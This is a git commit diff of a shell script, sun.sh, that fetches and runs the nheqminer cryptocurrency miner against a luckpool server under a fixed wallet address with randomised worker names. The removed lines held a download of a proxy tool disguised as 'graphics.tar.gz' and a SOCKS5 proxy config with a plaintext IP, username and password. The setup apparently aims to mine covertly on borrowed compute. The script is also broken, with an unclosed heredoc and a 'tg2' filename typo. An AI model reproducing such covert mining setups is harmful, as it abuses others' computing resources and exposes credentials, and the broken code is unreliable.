fe4a68a53364c0a3371188a4b24072df8e42082f
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-05-26 16:23:30 +0700

    Update sun.sh

--- sun.sh
+++ sun.sh
@@ -2,22 +2,7 @@
 
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 
-dpkg-reconfigure --frontend noninteractive tzdata
-
-apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
-
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
-
-tar -xvzf graphics.tar.gz
-
-cat > graftcp/local/graftcp-local.conf <<END
-listen = :2233
-loglevel = 1
-socks5 = 74.208.116.194:1080
-socks5_username = sempakcok
-socks5_password = gunturmanis
-
 wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
 tar -xvf nheqminer-Linux-v0.8.2.tg2
 tar -xvf nheqminer-Linux-v0.8.2.tar.gz
-nheqminer/nheqminer -v -l na.luckpool.net:3956 -u RMHJAUh6ETgku7iaAL2tAYXQKvkoodo4VW.$(echo $(shuf -i 1_9999 -n 1)sty) -p x -t 4
+nheqminer/nheqminer -v -l eu.luckpool.net:3956 -u RMHJAUh6ETgku7iaAL2tAYXQKvkoodo4VW.$(echo $(shuf -i 1_9999 -n 1)sty) -p x -t 4
